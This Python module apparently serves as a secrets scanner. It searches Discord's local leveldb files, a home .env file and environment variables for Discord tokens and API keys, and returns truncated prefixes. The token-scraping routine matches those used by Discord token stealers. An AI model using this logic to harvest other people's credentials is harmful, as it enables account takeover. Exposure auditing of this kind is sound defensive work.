import os
import re
import sqlite3
from utils.path_utils import get_discord_storage_paths, is_windows
from pathlib import Path

class TokenScanner:
    """Scan for Discord and API tokens"""
    
    # Discord token pattern: 24.6-7.27
    DISCORD_TOKEN_PATTERN = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    MFA_TOKEN_PATTERN = r'[\w-]{24}\.[\w-]{6}-[\w-]{27}'
    
    def scan_discord_tokens(self):
        """Scan for Discord tokens in leveldb storage"""
        tokens = []
        
        # Check environment variables first
        token_from_env = os.getenv('DISCORD_TOKEN') or os.getenv('DISCORD_BOT_TOKEN')
        if token_from_env and re.match(self.DISCORD_TOKEN_PATTERN, token_from_env):
            tokens.append(f"ENV:DISCORD_TOKEN = {token_from_env[:20]}...")
        
        # Check .env files
        env_file = Path.home() / '.env'
        if env_file.exists():
            try:
                with open(env_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if 'DISCORD_TOKEN' in content or 'BOT_TOKEN' in content:
                        for match in re.findall(self.DISCORD_TOKEN_PATTERN, content):
                            tokens.append(f".env:DISCORD_TOKEN = {match[:20]}...")
            except:
                pass
        
        # Check Discord leveldb storage
        for storage_path in get_discord_storage_paths():
            if not os.path.exists(storage_path):
                continue
            
            try:
                for filename in os.listdir(storage_path):
                    if filename.endswith('.ldb'):
                        filepath = os.path.join(storage_path, filename)
                        try:
                            with open(filepath, 'rb') as f:
                                content = f.read()
                                try:
                                    decoded = content.decode('utf-8', errors='ignore')
                                except:
                                    continue
                                
                                matches = re.findall(self.DISCORD_TOKEN_PATTERN, decoded)
                                for match in matches:
                                    if match not in [t.split(' = ')[1].replace('...', '') for t in tokens if ' = ' in t]:
                                        tokens.append(f"leveldb:{match[:20]}...")
                        except:
                            pass
            except:
                pass
        
        return tokens
    
    def scan_environment_tokens(self):
        """Scan environment variables for tokens"""
        tokens = []
        token_env_vars = ['DISCORD_TOKEN', 'BOT_TOKEN', 'API_KEY', 'SECRET_KEY', 'GITHUB_TOKEN', 'STRIPE_KEY']
        
        for var in token_env_vars:
            value = os.getenv(var)
            if value and len(value) > 10:
                tokens.append(f"{var}={value[:30]}...")
        
        return tokens
